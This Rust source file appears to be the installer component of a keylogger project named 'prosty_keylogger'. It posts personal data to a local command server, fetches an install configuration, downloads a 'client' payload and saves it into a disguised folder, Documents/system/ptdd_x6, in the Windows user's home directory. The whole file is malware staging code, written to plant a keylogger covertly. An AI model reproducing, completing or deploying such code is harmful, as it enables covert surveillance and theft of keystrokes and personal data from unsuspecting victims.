mod options;

use std::fs;
use std::path::{Path, PathBuf};
use reqwest::Url;
use std::env;
use log::error;
use prosty_keylogger::common::{InstallConfiguration, PersonalData, TaskConfiguration};

async fn download_client(url: Url) -> Result<Vec<u8>, anyhow::Error>{
    let web_client = reqwest::Client::new();
    let b= web_client.get(url.join("/client")?).send()
        .await?
        .bytes().await?;

    Ok(b.into())

}

fn download_and_save_client(url: Url, dir: &Path, filename: &Path) -> Result<(), anyhow::Error>{
    let rt = tokio::runtime::Runtime::new()?;
    let content = rt.block_on(async {
        let c = download_client(url).await?;
        return Ok::<Vec<u8>, anyhow::Error>(c)
    })?;
    let path = dir.join(filename);
    println!("{:?}", &dir);
    let d = fs::create_dir_all(&dir)?;
    let mut file = std::fs::File::create(&path)?;
    std::fs::write(path, content)?;
    Ok(())
}

fn install_client(install_configuration: &InstallConfiguration) -> Result<(), anyhow::Error>{
    let home_drive = env::var("HOMEDRIVE")?;
    let home_dir = env::var("HOMEPATH")?;
    println!("{}", home_dir);
    let dir = PathBuf::from_iter([&home_drive, &home_dir, "Documents/system/ptdd_x6"]);
    //let dir = PathFragment::join_slice(&task_configuration.installation_path)?;

    println!("{:?}", dir);
    let path = PathBuf::from("dl");
    download_and_save_client(Url::parse("http://localhost:8080")?, &dir, &path).unwrap();
    Ok(())
}

async fn get_config(url: Url, personal_data: Option<&PersonalData>) -> Result<InstallConfiguration, anyhow::Error>{
    let s = match personal_data{
        None => reqwest::get(url).await?.text().await?,
        Some(data) => {
            let client = reqwest::Client::new();
            let json = serde_json::to_string(&data)?;
            client.post(url.join("/install")?).json(&data).send().await?.text().await?
        }
    };
    let t: InstallConfiguration = serde_json::from_str(&s)?;
    Ok(t)
}
fn main()-> Result<(), anyhow::Error> {
    let rt = tokio::runtime::Runtime::new()?;
    let personal_data = PersonalData{
        name: None,
        last_name: None,
        gender: None,
    };

    let config = rt.block_on(async{
        //let config = get_config(Url::parse("http://127.0.0.1:8080/")?).await?;
        let config = get_config(Url::parse("http://127.0.0.1:8080")?, Some(&personal_data)).await?;
        return Ok::<InstallConfiguration, anyhow::Error>(config);

    })?;


    install_client(&config)?;
    Ok(())

}